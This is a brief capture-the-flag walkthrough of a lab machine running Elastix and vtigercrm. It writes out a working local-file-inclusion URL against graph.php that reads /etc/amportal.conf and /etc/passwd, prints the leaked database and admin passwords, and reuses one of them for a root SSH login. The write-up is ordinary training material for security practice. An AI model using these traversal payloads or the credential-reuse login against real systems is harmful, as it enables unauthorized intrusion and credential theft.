From the results from gobuster,
We were able to look into the folders without any restrictions.
10.10.10.7/admin/ requires for password
searchsploit elastix -> potential LFI vulnerability
Go to the exploit:
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

seems like there are some creds lying around:
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

the password jEhdIekWmdjE gave us admin access to the page.
We want a shell though, lets try ssh:
ssh admin@10.10.10.7 -> doesn't work

let's try to look at the users from the LFI above
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action

root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash

seems like these are the system users,
try with root:
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
jEhdIekWmdjE <- password
we got root shell!
root.txt is on current dir
find -type f -name user.txt
user.txt is at fanis's home directory
